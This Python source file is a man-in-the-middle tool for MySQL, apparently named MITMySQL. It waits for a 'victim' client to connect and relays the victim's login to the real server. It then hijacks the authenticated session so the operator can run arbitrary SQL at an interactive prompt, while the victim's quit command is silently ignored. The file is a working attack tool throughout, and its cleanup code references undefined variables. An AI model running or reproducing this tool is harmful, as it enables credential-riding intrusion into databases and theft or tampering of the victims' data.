# -*- coding: utf-8 -*-

from pymysql_wrapper import ConnectionWrapper, MysqlPacket, OKPacketWrapper, EOFPacketWrapper
from pymysql.connections import _makefile
from pymysql.constants import COMMAND

import concurrent.futures
import socket
import logging
import argparse

log_level = logging.INFO

logger = logging.getLogger(__name__)
logger.setLevel(log_level)

handler = logging.StreamHandler()
handler.setLevel(log_level)
logger.addHandler(handler)

logger.propagate = False


def authenticate(client, server):
    # initialize
    server._rfile = _makefile(server._sock, 'rb')
    server._next_seq_id = 0
    client.send(server._get_server_information())
    logger.info("[+] GOT SERVER INFORMATION: {}".format(server.get_server_info()))
    
    # passthrough the authentication information between client and server
    while True:
        client_payload = client.recv(4096)
        logger.debug("[*] REQUEST: {}".format(client_payload))
        server.write_packet(client_payload[4:])
        authentication_result_raw = server._read_packet_raw()
        client.send(authentication_result_raw)
        
        # ok response is the sign for the time when the authentication is succeeded.
        if MysqlPacket(authentication_result_raw[4:], server.encoding).is_ok_packet():
            break        
        logger.debug("[*] AUTHENTICATION PROCESS CONTINUES.")

    logger.info("[+] AUTHENTICATION SUCCEEDED")
    
def interpreter_parent(server_connection, worker):
    with server_connection.cursor() as cursor:
        while True:
            try:
                sql_query = input("> ")
                p = worker.submit(interpreter_child, server_connection, cursor, sql_query)
                print(p.result())
            except Exception as e:
                logger.debug("[-] Error occured: {}".format(e))

def interpreter_child(server, cursor, query):
    try:
        cursor.execute(query)
        return cursor.fetchall()
    except Exception as e:
        logger.debug("[-] INTERPRETER ERROR: {}".format(e))
        return e

def passthrough_parent(client, server, worker):
    try:
        while True:
            logger.debug("[*] WAITING CLIENT ON BACKGROUND...")
            payload = client.recv(4096)
            worker.submit(passthrough_child, client, server, payload).result()
    except Exception as e:
        logger.debug("[-] CLIENT ERROR: {} ".format(e))
            
def passthrough_child(client, server, payload):
    try:
        logger.debug("[*] SEND TO SERVER FROM CLIENT: {}".format(payload))
        server._next_seq_id = 0
        if payload[4] == COMMAND.COM_QUIT:
            logger.info("[+] CLIENT REQUESTED QUITTING, BUT IGNORE IT :-)")
            return
        server.write_packet(payload[4:])
        for _ in range(1 if payload[4] != COMMAND.COM_QUERY else 2):
            while True:
                packet_raw = server._read_packet_raw()
                packet = MysqlPacket(packet_raw[4:], server.encoding)            
                logger.debug("[*] SEND TO CLIENT FROM SERVER: {}".format(packet_raw))
                client.send(packet_raw)            
                if packet.is_eof_packet() and not EOFPacketWrapper(packet).has_next:
                    break
                if packet.is_ok_packet() and not OKPacketWrapper(packet).has_next:
                    break
        server._next_seq_id = 0        
        logger.debug("[*] PASSTHROUGH SUCCEEDED")
    except Exception as e:
        logger.debug("[-] PASSTHROUGH ERROR: {}".format(e))
    return
    
def main(local_addr, server_addr):
    logger.debug("[*] MITMySQL INFORMATION: {}, {}".format(local_addr, server_addr))

    # prepare local sockets
    local_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    local_sock.bind(local_addr)    
    local_sock.listen(1)
    
    # wait for a victim to connect here    
    logger.info("[*] WAITING FOR CLIENT...")
    client_connection, client_addr = local_sock.accept()
    logger.info('[*] CONNECTED BY: {}'.format(client_addr))

    # prepare remote socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect(server_addr)
    server_connection = ConnectionWrapper(defer_connect=True)
    server_connection._sock = server_sock
    
    # wait that the victim finish his authentication
    authenticate(client_connection, server_connection)

    sql_worker = concurrent.futures.ThreadPoolExecutor(max_workers=1)
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as e:
        e.submit(passthrough_parent, client_connection, server_connection, sql_worker)
        e.submit(interpreter_parent, server_connection, sql_worker)
                
    # finalize
    conn.close()
    local_sock.close()
    remote_sock.close()
    sql_worker.shutdown()
    
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='MITM for MySQL.')
    parser.add_argument('--lport', metavar='3306', type=int, default=3306,
                        help='port to bind local MITM server')
    parser.add_argument('--rport', metavar='3306', type=int, default=3306,
                        help='port of a remote MySQL server')
    parser.add_argument('--host', metavar='3306', type=str, required=True,
                        help='host of a remote MySQL server')
    

    args = parser.parse_args()
    main(('0.0.0.0', args.lport), (args.host, args.rport))
